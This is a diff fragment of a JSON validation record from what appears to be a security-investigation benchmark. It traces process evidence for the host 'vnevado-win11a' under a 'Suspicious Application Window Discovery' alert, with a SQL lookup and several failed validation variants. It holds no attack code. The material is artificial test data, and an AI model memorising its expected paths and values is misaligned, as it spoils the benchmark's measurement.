+              "raw_components": {
+                "ProcessId": "7472",
+                "CommandLine": "powershell.exe",
+                "CreatedTimeUtc": "2024-06-26T15:49:15.7860486Z"
+              },
+              "roles": [],
+              "entity_index": 2,
+              "alert_id": "197c2262-2cd9-4ca0-4c33-add856f8af63",
+              "time": "2024-07-22 22:39:51.192545+00:00",
+              "source_row_hash": "03facabee10f1d39cfd5777ab408a4a9e904f4d8889da60784571d1d72ee103f",
+              "matched_inputs": [
+                "vnevado-win11a"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "7472__2024-06-26t15:49:15.7860486z__powershell.exe",
+              "raw_components": {
+                "ProcessId": "7472",
+                "CommandLine": "powershell.exe",
+                "CreatedTimeUtc": "2024-06-26T15:49:15.7860486Z"
+              },
+              "roles": [],
+              "entity_index": 2,
+              "alert_id": "197c2262-2cd9-4ca0-4c33-add856f8af63",
+              "time": "2024-07-23 22:34:43.362337+00:00",
+              "source_row_hash": "0446b7941c5426d969d67e7e4f68b7b912674cedbe6637d43971002ed85dee1b",
+              "matched_inputs": [
+                "vnevado-win11a"
+              ]
+            }
+          ],
+          "witness_count": 29,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Host_Name' AND o.Concept = 'Process_Identity'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Suspicious Application Window Discovery",
+            "vnevado-win11a"
+          ],
+          "error": null
+        }
+      ]
+    }
+  ],
+  "offline_scope": "Uses official start entities; no intermediate or target value supplied to queries. Expected values checked only after results.",
+  "live_scope": "Exported merged PM/EM; session-local MySQL projection of original CSV, membership from SecurityIncident.AlertIds. Official graph supplies seed, expected path checked only AFTER full route execution.",
+  "delta": {
+    "sm": 0,
+    "em": 0,
+    "pm": 1
+  },
+  "live_validation_v1": [
+    {
+      "variant": "from_Command_File_Mention",
+      "passed": false,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "invalid_json",
+          "candidate_count": 0,
+          "expected_present": false,
+          "error": "Expecting ',' delimiter: line 1 column 459 (char 458)",
+          "alert_id": "f9c9ba44-9510-fd11-3c50-336c83f62f8a"
+        }
+      ]
+    },
+    {
+      "variant": "from_IP_Address",
+      "passed": false,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "invalid_json",
+          "candidate_count": 0,
+          "expected_present": false,
+          "error": "Expecting ',' delimiter: line 1 column 459 (char 458)",
+          "alert_id": "f9c9ba44-9510-fd11-3c50-336c83f62f8a"
+        }
+      ]
+    },
+    {
+      "variant": "from_Process_Identity",
+      "passed": false,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "invalid_json",
+          "candidate_count": 0,
+          "expected_present": false,
+          "error": "Expecting ',' delimiter: line 1 column 459 (char 458)",
+          "alert_id": "f9c9ba44-9510-fd11-3c50-336c83f62f8a"
+        }
+      ]
+    }
+  ],
+  "physical_revision": 2,
+  "verification": "exact_alert_and_edge_lineage"
+}
